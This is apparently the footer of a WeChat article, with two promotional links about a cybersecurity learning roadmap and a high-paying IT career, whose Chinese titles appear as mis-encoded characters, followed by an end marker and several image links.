[ç½‘ç»œå®‰å…¨å­¦ä¹ è·¯çº¿ï¼ˆ2025ï¼‰](https://mp.weixin.qq.com/s?__biz=MzkxMzMyNzMyMA==&mid=2247573602&idx=2&sn=66d3d048032a8a44f3c123316b763acc&scene=21#wechat_redirect)  
  
  
[å¹´è–ª40Wï¼ITäººçš„æ–°èµ›é“ï¼Œæˆ‘å†³å®šå…¥å±€ï¼](https://mp.weixin.qq.com/s?__biz=MzkxMzMyNzMyMA==&mid=2247569416&idx=1&sn=84534e444df55574f9beea708e26ca8d&scene=21#wechat_redirect)  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/utAMSQWh9sUWmzvbEqyVxYPkYu24CRrXIPaUiaibicvhTUX0icpbo8Ia1b5UpPLuibvVlQmiaocIsuPY2jE7jSHBae6w/640?wx_fmt=png "")  
  
END  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/UkV8WB2qYAmjibAV4BUhx72mfcWYA3HW7PqyBOH13kHS3iamdQSvA4ibu5da6xnWclJ6gtLRv5BA6O2fbM6sxTMrw/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/iaIicfo73Ma1uic9ZGkCFpwBiaw1YVt1l4Uibcibk8C6C52t27qBiaw37w5ko1SnjuyT011DBH2jjPQNnpcFMtAFLibGGQ/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=wxpic "")  
  
  
